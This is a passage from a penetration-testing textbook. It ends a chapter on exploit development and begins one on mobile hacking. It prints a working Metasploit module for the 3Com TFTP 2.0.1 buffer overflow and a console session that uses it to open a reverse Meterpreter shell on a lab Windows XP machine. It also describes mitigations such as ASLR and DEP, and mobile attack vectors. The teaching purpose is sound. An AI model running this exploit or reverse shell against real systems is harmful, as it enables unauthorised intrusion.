### Optimized Text

```ruby
def exploit
  connect_udp
  print_status("Trying target #{target.name}...")

  # Construct the exploit payload
  sploit = "\x00\x02" + rand_text_english(7, payload_badchars) + "\x00"
  sploit += payload.encoded + [target.ret].pack('V') + "\x00"

  udp_sock.put(sploit)
  handler
  disconnect_udp
end
```

**Listing 19-11: Edited module, part 2**

As in the Python exploit, we start by telling the TFTP server to write to a file. We then use the `rand_text_english` function to create a random seven-character filename. This method is superior to using static letters, as predictability can be used to write signatures for antivirus programs, intrusion-prevention systems, and so on.

Next, we follow the specification for a TFTP packet with a null byte to finish the filename. We then append the user’s chosen payload and the return address. Finally, we complete the packet with another null byte, as per the TFTP specification.

After closing the exploit function with `end`, ensure you also close the module properly.

We have now written an exploit module for the 3Com TFTP 2.0.1 long transport mode vulnerability. Save the file in `/root/.msf4/modules/exploits/windows/tftp/myexploit.rb`, and then run the `Msftidy` tool on the module to verify that it meets the format specifications for Metasploit modules. Make any formatting changes that `Msftidy` suggests before submitting a module to the Metasploit repository.

```bash
root@kali:~# cd /usr/share/metasploit-framework/tools/
root@kali:/usr/share/metasploit-framework/tools# ./msftidy.rb /root/.msf4/modules/exploits/windows/tftp/myexploit.rb
```

**Note:** From time to time, Metasploit makes changes to its desired syntax. Run `msfupdate` to get the latest version of `Msftidy` if you are actually going to submit a module to the repositories. In this case, we don’t need to worry about it, and running `msfupdate` may cause other exercises in the book to break, so I don’t recommend it for now.

Restart `Msfconsole` to load the latest modules, including any in the `.msf4/modules` directory. If you have made any syntax errors, Metasploit will display the details of the modules it was unable to load.

Now use your new exploit module to attack your Windows XP target. As shown in Listing 19-12, Metasploit can fit many payloads in 473 characters, including Meterpreter.

```bash
msf > use windows/tftp/myexploit
msf exploit(myexploit) > show options

Module options (exploit/windows/tftp/myexploit):
Name          Current Setting  Required  Description
----          ---------------  --------  -----------
RHOST         yes              The target address
RPORT         69               yes       The target port

Exploit target:
Id  Name
--  ----
0   Windows XP Pro SP3 English

msf exploit(myexploit) > set RHOST 192.168.20.10
RHOST => 192.168.20.10
msf exploit(myexploit) > show payloads
--snip--
msf exploit(myexploit) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(myexploit) > set LHOST 192.168.20.9
LHOST => 192.168.20.9
msf exploit(myexploit) > exploit

[*] Started reverse handler on 192.168.20.9:4444
[*] Trying target Windows XP Pro SP3 English...
[*] Sending stage (752128 bytes) to 192.168.20.10
[*] Meterpreter session 1 opened (192.168.20.9:4444 -> 192.168.20.10:4662) at 2015-02-09 09:28:35 -0500
meterpreter >
```

**Listing 19-12: Using your module**

Now that we’ve walked through one example of writing a Metasploit module, here’s an idea for another. A Metasploit module that can exploit the War-FTP 1.65 USER buffer overflow, found at `/usr/share/metasploit-framework/modules/exploits/windows/ftp/warftpd_165_user.rb`, uses the saved return pointer overwrite technique. Try writing a similar module that uses the SEH overwrite technique we worked through in Chapter 18.

### Exploitation Mitigation Techniques

We discussed one exploit mitigation technique, called SafeSEH, in Chapter 18. In typical cat-and-mouse fashion, attackers develop new exploitation techniques while platforms implement mitigation techniques, and then attackers come up with something new. Here, we will briefly discuss a few modern exploit mitigation methods. This list is by no means complete, nor is it within the scope of this book to discuss writing exploits that successfully bypass all these restrictions. There are many advanced exploitation and payload delivery techniques, such as heap sprays and return-oriented programming, beyond those discussed here. Check out my website (http://www.bulbsecurity.com/) and the Corelan Team’s website (http://www.corelan.be/) for more information on advanced exploit development techniques.

#### Stack Cookies

Naturally, as buffer overflow exploits became prevalent, developers wanted to stop these sorts of attacks from hijacking execution. One way to do so is by implementing stack cookies, also known as canaries. At the start of a program, a stack cookie is calculated and added to the `.data` section of memory. Functions that use structures prone to buffer overflows, such as string buffers, grab the canary value from `.data` and push it onto the stack after the saved return address and EBP. Just before a function returns, it checks the value of the canary on the stack against the value in `.data`. If the values don’t match, a buffer overflow is detected, and the program is terminated before the attack can hijack execution.

You can use multiple techniques for bypassing stack cookies, such as triggering an SEH overwrite and exception before the vulnerable function returns and hijacking execution before the canary value is checked.

#### Address Space Layout Randomization (ASLR)

The exploits we have written in this book have relied on certain instructions being at certain memory addresses. For example, in our first War-FTP stack-based buffer overflow example in Chapter 17, we relied on a JMP ESP equivalent instruction in the Windows MSVCRT.dll module being at memory address 0x77C35459 on all Windows XP SP3 English systems. In our SEH overwrite example in Chapter 18, we relied on the POP POP RET instructions in War-FTP’s MFC42.dll module being at memory address 0x5F4580CA. If neither case were true, our entire attack approach would have been undermined, and we would have to find the instructions before we could execute them.

When ASLR is implemented, you can’t count on certain instructions being at certain memory addresses. To see ASLR in action, open the Winamp program in Immunity Debugger on your Windows 7 virtual machine. Note the memory locations of Winamp.exe and some Windows DLLs such as USER32 and SHELL32. Now restart the system and try again. You should notice that the locations of the Windows components change at reboot while the location of Winamp.exe stays the same. In my case, the first time I looked at Winamp in Immunity Debugger, the memory locations were as follows:

- 00400000 Winamp.exe
- 778B0000 USER32.dll
- 76710000 SHELL32.dll

After reboot, they looked like this:

- 00400000 Winamp.exe
- 770C0000 USER32.dll
- 75810000 SHELL32.dll

Like SafeSEH, there is no rule in Windows that programs must implement ASLR. Even some Windows applications such as Internet Explorer didn’t implement ASLR right away. However, Windows Vista and later shared libraries such as USER32.dll and SHELL32.dll do use ASLR. If we want to use any code in these libraries, we will not be able to call instructions directly from a static address.

#### Data Execution Prevention (DEP)

In the exploits we developed in the past few chapters, we relied on the ability to inject our shellcode into memory somewhere, pass execution to the shellcode, and have the shellcode execute. DEP makes this a little harder by designating specific parts of memory as non-executable. If an attacker tries to execute code from non-executable memory, the attack will fail.

DEP is used in most modern versions of Windows, as well as Linux, Mac OS, and even Android platforms. iOS does not require DEP, as discussed in the next section.

To bypass DEP, attackers typically use a technique called return-oriented programming (ROP). ROP allows attackers to execute specific instructions already included in executable memory. One common technique is to use ROP to create a section of memory that is writable and executable, and then write the payload to this memory segment and execute it.

#### Mandatory Code Signing

Apple’s iOS team takes a different approach to preventing malicious code from executing. All code that executes on an iPhone must be signed by a trusted authority, usually Apple itself. To run an application on an iPhone, developers must submit the code for Apple’s review. If Apple determines that their app is not malicious, it is usually approved and the code is signed by Apple.

One common route that malware authors take to bypass detection at install time is downloading new, potentially malicious code at runtime and executing it. However, because all memory pages must be signed by a trusted authority, this sort of attack will fall flat on an iPhone. As soon as the application attempts to run unsigned code, the CPU will reject it, and the application will crash. DEP is not required, because mandatory code signing takes the protection a step further.

Of course, it is possible to write exploits that bypass these restrictions, as with iPhone jailbreaks, but on the latest versions of iOS, a jailbreak is no small feat. Rather than using ROP briefly to create a DEP bypass, with mandatory code signing, the entire payload must be created using ROP.

One mitigation technique alone is not enough to foil the most skilled exploit developers armed with the latest methods. As a result, exploit mitigation techniques are typically chained together to further foil attacks. For example, iOS uses both mandatory code signing and full ASLR. Thus, an attacker has to use ROP for the entire payload, and thanks to ASLR, building a ROP payload is no picnic.

### Summary

In this chapter, we looked at a few odds and ends for basic exploit development. We covered a technique called fuzzing to find potential exploitation points. We also looked at working with public exploits and porting them to meet our needs. We replaced the shellcode using Msfvenom and found a return address that works with our platform. Next, we looked at porting a completed Python exploit into our first Metasploit module. Starting with a module for a similar issue, we made changes to fit the 3Com TFTP long transport mode buffer overflow vulnerability. Finally, we talked briefly about some of the exploitation mitigation techniques that you will encounter as you continue your study of exploit development.

We are nearing the end of our journey into the basics of penetration testing. Let’s finish up with a chapter on assessing the security of mobile devices.

### Part V: Mobile Hacking

#### Chapter 20: Using the Smartphone Pentest Framework

Bring your own device (BYOD) is a big buzzword in the industry right now. Though we’ve been bringing our own devices to work in one form or another for years (contractor laptops or that game console someone left connected to the network in the breakroom, for example), mobile devices are now entering the workplace en masse, and it falls to security teams and pentesters to evaluate the security risks of these devices.

In this chapter, we’ll focus on tools and attacks for assessing the security of mobile devices. Mobile technology is a rapidly developing field, and though we can cover only the basics here, developing new mobile attacks and post-exploitation techniques is an ideal place to start with your own security research. For example, we’ll be discussing a tool I created to help pentesters assess the security posture of mobile devices, the Smartphone Pentest Framework (SPF). After working your way through this book, you will be ready to embark on your own infosec journey and perhaps write a tool of your own.

For most of the examples in this chapter, we’ll use the Android platform as a target because, in addition to being the most ubiquitous platform, it also allows you to create emulators on Windows, Linux, and Mac OS platforms. Although we’ll focus on Android, we’ll also explore an attack on a jailbroken iPhone.

#### Mobile Attack Vectors

Though mobile devices run operating systems, speak TCP/IP, and access a lot of the same resources that traditional computers do, they also have their own unique features that add new attack vectors and protocols to the mix. Some features have been causing security problems on devices for years, while others such as near field communication, discussed later, are fairly new.

##### Text Messages

Many mobile devices can send and receive text (SMS) messages. Though limited in size, text messages allow users to communicate almost simultaneously, often replacing email for written communications. SMS opens up a new social-engineering attack vector.

Traditionally, email has been the medium for sending spam and phishing attempts, but even free email solutions do a decent job of filtering out the garbage these days. (If you ever need a laugh at work, check your email spam folder.) SMS is a different story: although some mobile antivirus suites allow you to blacklist and whitelist certain mobile numbers, generally if you text a number to a device, the message will be received. This makes SMS an ideal vector for spam and phishing attacks.

We’re already seeing annoying mobile ads and SMS phishing attempts that lure users to a counterfeit website to enter their credentials, much like the site-cloning attacks from Chapter 11. These attacks will no doubt become more prevalent as time goes on. Security-awareness training will need to be augmented to include this threat. A user who knows better than to click a random link in a suspicious-looking email may still click a random link in a text message. After all, it’s just a text—how could a text possibly hurt you? But that link will open in the mobile browser or another app that may contain additional vulnerabilities.

##### Near Field Communication (NFC)

Mobile devices bring yet another attack vector to the table: near field communication, or NFC. NFC allows devices to share data by touching or being near each other. Mobile devices with NFC enabled can scan NFC tags to automate tasks such as changing settings or opening applications. Some can beam data, such as a photo or an entire app, from one device to another. NFC is another ideal social-engineering attack vector. For example, in Mobile Pwn2Own 2013, an exploitation contest, researchers used NFC to attack an Android device by beaming a malicious payload to a vulnerable application on the device. Therefore, security awareness training should also teach users to be aware of which NFC tags their device responds to and who they are beaming data with.

##### QR Codes

Quick response (QR) codes are matrix barcodes originally developed for use in auto manufacturing. QR codes can embed URLs, send data to an application on a mobile device, and so on, and users should be aware that what they are scanning may open something malicious. That QR code on a store window doesn’t have to point to the store’s website, and malicious QR code attacks have occurred in the wild. For instance, one prominent hacktivist changed his Twitter profile picture to a QR code, prompting many curious users to scan it with their phones. The QR code directed them to a malicious web page that attempted to exploit vulnerabilities in WebKit, a web page rendering engine used by both iOS and Android.

#### The Smartphone Pentest Framework (SPF)

Enough talk; let’s turn our attention to actually attacking mobile devices with the help of SPF. SPF is still under active development and its feature set changes rapidly. By the time you work through this section, many of the menus may offer additional options. In Chapter 1, you downloaded the version of the SPF used in this book, but to get the main and most up-to-date branch of SPF, visit https://github.com/georgiaw/Smartphone-Pentest-Framework.git/.

##### Setting Up SPF

If you followed the instructions in Chapter 1, SPF should be all set up and ready to go. Because SPF uses Kali’s built-in web server to deliver some payloads, ensure that the web server is running and configured correctly.